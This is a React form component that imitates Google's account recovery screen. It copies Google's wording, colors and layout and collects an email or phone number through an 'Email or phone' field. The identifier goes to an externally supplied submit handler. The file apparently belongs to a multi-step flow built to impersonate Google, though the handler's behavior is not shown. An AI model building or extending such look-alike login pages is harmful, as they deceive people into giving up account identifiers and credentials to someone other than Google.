import React, { useState } from 'react';
import { Loader2 } from 'lucide-react';

export default function StepIdentifier({ onSubmit, loading, error, initialValue = '' }) {
  const [identifier, setIdentifier] = useState(initialValue || '');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!identifier.trim()) return;
    onSubmit(identifier.trim());
  };

  return (
    <div className="w-full text-left">
      {/* Title */}
      <h1 className="text-[24px] sm:text-[28px] font-normal text-[#1f1f1f] tracking-tight leading-tight mb-2">
        Account recovery
      </h1>

      <p className="text-[14px] sm:text-[15px] text-[#444746] mb-8 font-normal">
        To help keep your account safe, Google wants to make sure it’s really you trying to sign in
      </p>

      {/* Error notification */}
      {error && (
        <div className="mb-6 p-3 rounded-md bg-[#fdeded] border border-[#f5c2c7] text-[#b02a37] text-xs">
          {error}
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Outlined Input */}
        <div>
          <div className="relative">
            <input
              type="text"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder="Email or phone"
              required
              autoFocus
              className="w-full h-[56px] px-4 bg-white border border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0] focus:border-2 rounded-[4px] text-[#1f1f1f] placeholder:text-[#444746] text-[16px] outline-none transition-colors"
            />
          </div>
        </div>

        {/* Forgot email link */}
        <div className="pt-1">
          <button
            type="button"
            className="text-[14px] font-medium text-[#0b57d0] hover:underline"
          >
            Forgot email?
          </button>
        </div>

        {/* Bottom Actions Row */}
        <div className="flex items-center justify-between pt-12">
          <button
            type="button"
            className="text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] px-3 py-2 rounded-full transition-colors -ml-3"
          >
            Create account
          </button>

          <button
            type="submit"
            disabled={loading || !identifier.trim()}
            className="inline-flex items-center justify-center gap-2 min-w-[88px] px-6 h-[40px] rounded-full bg-[#0b57d0] hover:bg-[#0842a0] text-white font-medium text-[14px] transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-none"
          >
            {loading ? (
              <Loader2 className="w-4 h-4 animate-spin text-white" />
            ) : (
              <span>Next</span>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
